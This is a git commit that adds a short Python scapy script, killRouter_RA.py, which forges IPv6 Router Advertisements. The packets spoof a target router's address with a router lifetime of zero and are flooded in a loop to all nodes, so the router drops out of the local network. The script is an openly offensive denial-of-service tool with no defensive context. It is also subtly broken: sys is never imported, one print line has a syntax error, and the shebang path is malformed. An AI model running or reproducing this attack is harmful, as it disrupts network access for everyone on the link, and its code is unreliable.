b36811cf079aee41b7ba4b9a403b22bae12d9250
bavaria10 <92851687+vafekt@users.noreply.github.com>
2022-11-27 01:16:39 +0100

    Create killRouter_RA.py

---
+++ IPv6 Generating Tools/killRouter_RA.py
@@ -0,0 +1,17 @@
+#! usr/bin/python
+from scapy.layers.inet6 import IPv6, ICMPv6ND_RA
+from scapy.sendrecv import send
+
+# Ask user to insert value
+if len(sys.argv) == 2:
+    target_ip = sys.argv[1]
+else:
+    print("Please insert:\n 1. Target's link-local address")
+    sys.exit(1)
+
+# Generate packet
+print("Killing the router with address " + target_ip.)
+layer3 = IPv6(src=target_ip, dst="ff02::1")
+packet = layer3/ICMPv6ND_RA(prf="High", routerlifetime=0)
+send(packet, loop=1)
+
